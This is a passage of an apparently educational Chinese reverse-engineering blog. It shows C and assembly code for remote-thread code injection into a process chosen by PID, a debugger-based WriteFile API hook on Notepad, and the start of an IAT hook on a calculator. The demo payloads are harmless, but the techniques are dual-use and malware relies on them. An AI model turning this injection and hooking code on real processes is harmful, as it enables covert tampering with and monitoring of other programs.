MessageBoxA</span><br><span class="hljs-comment">//www.reversecode.com , ReverseCore</span><br>&#125;THREAD_PARAM,*PTHREAD_PARAM;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 函数指针名为PFLOADLIBRARYA，参数为lpLibFileName</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* PFLOADLIBRARYA)</span></span><br><span class="hljs-function"><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpLibFileName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* PFGETPROCADDRESS)</span></span><br><span class="hljs-function"><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* PFMESSAGEBOX)</span></span><br><span class="hljs-function"><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpCation,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT uType</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>PTHREAD_PARAM pParam = (PTHREAD_PARAM)lParam;<br>HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>FARPROC pFunc = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Loadlibrary(&quot;user32.dll&quot;)</span><br><span class="hljs-comment">* pParam-&gt;pFunc[0]-&gt;kernel32!LoadLibraryA()</span><br><span class="hljs-comment">* pParam-&gt;szBuf[0]-&gt;user32.dll</span><br><span class="hljs-comment">*/</span><br>hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="hljs-number">0</span>])(pParam-&gt;szBuf[<span class="hljs-number">0</span>]);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* GetProcAddress(&quot;MessageBoxA&quot;)</span><br><span class="hljs-comment">* pParam-&gt;pFunc[1] -&gt; kernel32!GetProcAddress()</span><br><span class="hljs-comment">* pParam-&gt;szBuf[1] -&gt; MessageBoxA</span><br><span class="hljs-comment">*/</span><br>pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="hljs-number">1</span>])(hMod, pParam-&gt;szBuf[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* MessageBoxA(NULL,www.reversecode.com,ReverseCore,MB_OK)</span><br><span class="hljs-comment">* pParam-&gt;szBuf[2]-&gt;www.reversecode.com</span><br><span class="hljs-comment">* pParam-&gt;szBuf[3]-&gt;ReverseCore</span><br><span class="hljs-comment">*/</span><br>((PFMESSAGEBOX)pFunc)(<span class="hljs-literal">NULL</span>, pParam-&gt;szBuf[<span class="hljs-number">2</span>], pParam-&gt;szBuf[<span class="hljs-number">3</span>], MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">InjectCode</span><span class="hljs-params">(DWORD dwPID)</span></span><br><span class="hljs-function"></span>&#123;<br>HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>THREAD_PARAM param = &#123; <span class="hljs-number">0</span>, &#125;;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>LPVOID pRemoteBuf[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, &#125;;<br>DWORD dwSize = <span class="hljs-number">0</span>;<br><br>hMod = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>param.pFunc[<span class="hljs-number">0</span>] = <span class="hljs-built_in">GetProcAddress</span>(hMod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>param.pFunc[<span class="hljs-number">1</span>] = <span class="hljs-built_in">GetProcAddress</span>(hMod, <span class="hljs-string">&quot;GetProcAddress&quot;</span>);<br><br><span class="hljs-built_in">strcpy_s</span>(param.szBuf[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;user32.dll&quot;</span>);<br><span class="hljs-built_in">strcpy_s</span>(param.szBuf[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br><span class="hljs-built_in">strcpy_s</span>(param.szBuf[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;www.reversecore.com&quot;</span>);<br><span class="hljs-built_in">strcpy_s</span>(param.szBuf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;ReverseCore&quot;</span>);<br><br>hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID);<br>dwSize = <span class="hljs-built_in">sizeof</span>(THREAD_PARAM);<br>pRemoteBuf[<span class="hljs-number">0</span>] = <span class="hljs-built_in">VirtualAllocEx</span>(<br>hProcess,<br><span class="hljs-literal">NULL</span>,<br>dwSize,<br>MEM_COMMIT,<br>PAGE_READWRITE<br>);<br><br><span class="hljs-built_in">WriteProcessMemory</span>(<br>hProcess,<br>pRemoteBuf[<span class="hljs-number">0</span>],<br>(LPVOID)&amp;param,<br>dwSize,<br><span class="hljs-literal">NULL</span><br>);<br><br>dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;<br>pRemoteBuf[<span class="hljs-number">1</span>] = <span class="hljs-built_in">VirtualAllocEx</span>(<br>hProcess,<br><span class="hljs-literal">NULL</span>,<br>dwSize,<br>MEM_COMMIT,<br>PAGE_EXECUTE_READWRITE<br>);<br><span class="hljs-built_in">WriteProcessMemory</span>(<br>hProcess,<br>pRemoteBuf[<span class="hljs-number">1</span>],<br>(LPVOID)ThreadProc,<br>dwSize,<br><span class="hljs-literal">NULL</span><br>);<br><br>hThread = <span class="hljs-built_in">CreateRemoteThread</span>(<br>hProcess,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-number">0</span>,<br>(LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="hljs-number">1</span>],<br>pRemoteBuf[<span class="hljs-number">0</span>],<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span><br>);<br><span class="hljs-built_in">WaitForSingleObject</span>(hThread,INFINITE);<br><span class="hljs-built_in">CloseHandle</span>(hThread);<br><span class="hljs-built_in">CloseHandle</span>(hProcess);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwPID = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n USAGE : %ss pid \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br>dwPID = (DWORD)<span class="hljs-built_in">atol</span>(argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">InjectCode</span>(dwPID);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="使用汇编语言编写注入代码"><a href="#使用汇编语言编写注入代码" class="headerlink" title="使用汇编语言编写注入代码"></a>使用汇编语言编写注入代码</h1><h2 id="OllyDbg的汇编命令"><a href="#OllyDbg的汇编命令" class="headerlink" title="OllyDbg的汇编命令"></a>OllyDbg的汇编命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">068C0000   55               PUSH EBP<br>068C0001   8BEC             MOV EBP,ESP<br>068C0003   8B75 08          MOV ESI,DWORD PTR SS:[EBP+0x8];取出第一个参数<br>068C0006   68 6C6C0000      PUSH 0x6C6C<br>068C000B   68 33322E64      PUSH 0x642E3233<br>068C0010   68 75736572      PUSH 0x72657375<br>068C0015   54               PUSH ESP ;压入user32.dll字符串<br>068C0016   FF16             CALL DWORD PTR DS:[ESI];调用LoadLibraryA(&quot;user32.dll&quot;)<br>068C0018   68 6F784100      PUSH 0x41786F<br>068C001D   68 61676542      PUSH 0x42656761<br>068C0022   68 4D657373      PUSH 0x7373654D<br>068C0027   54               PUSH ESP;压入MessageBoxA字符串<br>068C0028   50               PUSH EAX;压入user32.dll模块的地址<br>068C0029   FF56 04          CALL DWORD PTR DS:[ESI+0x4];调用GetProcess(hMod,&quot;MessageBoxA&quot;)<br>068C002C   6A 00            PUSH 0x0<br>068C002E   E8 0C000000      CALL 068C003F ;call指令是先push然后执行jmp,即可将字符串压入栈中<br>068C0033   52               PUSH EDX<br>068C0034   65:76 65         JBE SHORT 068C009C<br>068C0037   72 73            JB SHORT 068C00AC<br>068C0039   65:43            INC EBX<br>068C003B   6F               OUTS DX,DWORD PTR DS:[ESI]<br>068C003C   72 65            JB SHORT 068C00A3<br>068C003E   00E8             ADD AL,CH ;调用call068C0058,也是将字符串压入栈中<br>068C0040   14 00            ADC AL,0x0<br>068C0042   0000             ADD BYTE PTR DS:[EAX],AL<br>068C0044   77 77            JA SHORT 068C00BD<br>068C0046   77 2E            JA SHORT 068C0076<br>068C0048   72 65            JB SHORT 068C00AF<br>068C004A   76 65            JBE SHORT 068C00B1<br>068C004C   72 73            JB SHORT 068C00C1<br>068C004E   65:636F 72       ARPL WORD PTR GS:[EDI+0x72],BP<br>068C0052   65               GS:<br>068C0053   2E:636F 6D       ARPL WORD PTR CS:[EDI+0x6D],BP<br>068C0057   006A 00          ADD BYTE PTR DS:[EDX],CH<br>068C005A   FFD0             CALL EAX<br>068C005C   33C0             XOR EAX,EAX<br>068C005E   8BE5             MOV ESP,EBP<br>068C0060   5D               POP EBP<br>068C0061   C3               RETN<br><br></code></pre></td></tr></table></figure><p><strong>OD保存文件</strong></p><p><img src="https://cdn.jsdelivr.net/gh/h0pe-ay/picgo//image-20220203211222663.png" alt="image-20220203211222663"></p><p><img src="https://cdn.jsdelivr.net/gh/h0pe-ay/picgo//image-20220203211310547.png" alt="image-20220203211310547"></p><p><img src="https://cdn.jsdelivr.net/gh/h0pe-ay/picgo//image-20220203211327879.png" alt="image-20220203211327879"></p><p><img src="https://cdn.jsdelivr.net/gh/h0pe-ay/picgo//image-20220203211454786.png" alt="image-20220203211454786"></p><p><img src="https://cdn.jsdelivr.net/gh/h0pe-ay/picgo//image-20220203211530544.png" alt="image-20220203211530544"></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向工程核心原理--HOOK</title>
    <link href="/2023/06/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86--HOOK/"/>
    <url>/2023/06/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86--HOOK/</url>
    
    <content type="html"><![CDATA[<h1 id="记事本WriteFile-API钩取"><a href="#记事本WriteFile-API钩取" class="headerlink" title="记事本WriteFile()API钩取"></a>记事本WriteFile()API钩取</h1><p>通过HOOK地址，修改地址所对应的内容完成修改。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><br><span class="hljs-comment">//WriteFile函数的地址</span><br>LPVOID g_pfWriteFile = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//Debug进程信息</span><br>CREATE_PROCESS_DEBUG_INFO g_cpdi;<br>BYTE g_chINT3 = <span class="hljs-number">0xCC</span>, g_ch0rgByte = <span class="hljs-number">0</span>;<br><span class="hljs-function">BOOL <span class="hljs-title">OnCreateProcessDebugEvent</span><span class="hljs-params">(LPDEBUG_EVENT pde)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//获取WriteFile函数的地址，这里获取的是调试进程Write函数的地址</span><br><span class="hljs-comment">//但是对于Windows OS的系统DLL来说，DLL加载地址为同一个</span><br>g_pfWriteFile = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;WriteFile&quot;</span>);<br><span class="hljs-comment">//将被调试进程的信息拷贝到g_cpdi中</span><br><span class="hljs-built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="hljs-built_in">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));<br><span class="hljs-comment">//读取被调试进程中WriteFile函数所在地址的指令，只读取一个字节</span><br><span class="hljs-built_in">ReadProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, &amp;g_ch0rgByte, <span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//将被调试进程中WriteFile函数所在地址的指令的首个字节修改为INT3指令，实现断点</span><br><span class="hljs-built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, <span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">OnExceptionDebugEvent</span><span class="hljs-params">(LPDEBUG_EVENT pde)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//包含特定于处理器的寄存器数据</span><br>CONTEXT ctx;<br>PBYTE lpBuffer = <span class="hljs-literal">NULL</span>;<br>DWORD dwNumberOfBytesToWrite, dwAddrOfBuffer, i;<br><span class="hljs-comment">//用于描述异常</span><br>PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;<br><br><span class="hljs-comment">//异常为断点异常</span><br><span class="hljs-keyword">if</span> (EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode)<br>&#123;<br><span class="hljs-keyword">if</span> (g_pfWriteFile == per-&gt;ExceptionAddress)<br>&#123;<br><span class="hljs-comment">//将WriteFile函数所在地址指令恢复原来的状态，去除掉INT3指令</span><br><span class="hljs-built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, &amp;g_ch0rgByte, <span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">//获取进程的上下文信息</span><br>ctx.ContextFlags = CONTEXT_CONTROL;<br><span class="hljs-built_in">GetThreadContext</span>(g_cpdi.hThread, &amp;ctx);<br><br><span class="hljs-comment">//读取WriteFile函数的第二个参数，即写入的缓冲区的地址</span><br><span class="hljs-built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="hljs-number">0x8</span>), &amp;dwAddrOfBuffer, <span class="hljs-built_in">sizeof</span>(DWORD), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//读取WriteFile函数的第三个参数，即需要写入的字节数</span><br><span class="hljs-built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="hljs-number">0xc</span>), &amp;dwNumberOfBytesToWrite, <span class="hljs-built_in">sizeof</span>(DWORD), <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">//分配空间，待写入数据</span><br>lpBuffer = (PBYTE)<span class="hljs-built_in">malloc</span>(dwNumberOfBytesToWrite + <span class="hljs-number">1</span>);<br><span class="hljs-built_in">memset</span>(lpBuffer, <span class="hljs-number">0</span>, dwNumberOfBytesToWrite + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//将数据写入到临时缓冲区中</span><br><span class="hljs-built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (PVOID)dwAddrOfBuffer, lpBuffer, dwNumberOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n### original string : %s\n&quot;</span>, lpBuffer);<br><br><span class="hljs-comment">//将小写转化为大写字母</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; dwNumberOfBytesToWrite; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (lpBuffer[i] &gt;= <span class="hljs-number">0x61</span> &amp;&amp; lpBuffer[i] &lt;= <span class="hljs-number">0x7a</span>)<br>lpBuffer[i] -= <span class="hljs-number">0x20</span>;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n### converted string :%s\n&quot;</span>, lpBuffer);<br><span class="hljs-built_in">WriteProcessMemory</span>(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumberOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">free</span>(lpBuffer);<br><span class="hljs-comment">//修改EIP指针为WriteFile函数，使得程序正常执行</span><br>ctx.Eip = (DWORD)g_pfWriteFile;<br><span class="hljs-built_in">SetThreadContext</span>(g_cpdi.hThread, &amp;ctx);<br><br><span class="hljs-comment">//运行被调试进程</span><br><span class="hljs-built_in">ContinueDebugEvent</span>(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//继续下钩子</span><br><span class="hljs-built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, <span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DebugLoop</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>DEBUG_EVENT de;<span class="hljs-comment">//描述调试事件</span><br>DWORD dwContinueStatus;<br><br><span class="hljs-comment">//等待正在调试的进程中发生调试事件</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">WaitForDebugEvent</span>(&amp;de, INFINITE))<br>&#123;<br>dwContinueStatus = DBG_CONTINUE;<br><span class="hljs-comment">//被调试进程生产或者附加事件</span><br><span class="hljs-keyword">if</span> (de.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT)<br>&#123;<br><span class="hljs-built_in">OnCreateProcessDebugEvent</span>(&amp;de);<br>&#125;<br><span class="hljs-comment">//异常事件,用于处理INT3指令</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">OnExceptionDebugEvent</span>(&amp;de))<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-comment">//被调试进程中止事件</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">ContinueDebugEvent</span>(de.dwProcessId, de.dwThreadId, dwContinueStatus);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwPID;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUSAGE : hookdbg.exe pid\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>    <span class="hljs-comment">//输入进程号</span><br>dwPID = <span class="hljs-built_in">atoi</span>(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//使调试器能够附加到活动进程并对其进行调试。</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DebugActiveProcess</span>(dwPID))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DebugActiveProcess(%d) failed!!!\n&quot;</span><br><span class="hljs-string">&quot;Error Code = %d\n&quot;</span>, dwPID, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">DebugLoop</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="计算器显示中文数字"><a href="#计算器显示中文数字" class="headerlink" title="计算器显示中文数字"></a>计算器显示中文数字</h1><p><strong>hookiat</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;wchar.h&gt;</span></span><br><br><span class="hljs-comment">//定义了一个布尔型的函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* PFSETWINDOWTEXTW)</span><span class="hljs-params">(HWND hWnd, LPWSTR lpString)</span></span>;<br><br><span class="hljs-comment">//SetWindowTextW的地址</span><br>FARPROC g_pOrgFunc = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">MySetWindowTextW</span><span class="hljs-params">(HWND hWnd, LPWSTR lpString)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* pNum = <span class="hljs-string">L&quot;零一二三四五六七八九&quot;</span>;<br>    <span class="hljs-type">wchar_t</span> temp[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, nLen = <span class="hljs-number">0</span>, nIndex = <span class="hljs-number">0</span>;<br><br>    nLen = <span class="hljs-built_in">wcslen</span>(lpString);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nLen; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="hljs-string">L&#x27;9&#x27;</span>)<br>        &#123;<br>            temp[<span class="hljs-number">0</span>] = lpString[i];<br>            nIndex = _wtoi(temp);<br>            lpString[i] = pNum[nIndex];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">hook_iat</span><span class="hljs-params">(LPCSTR 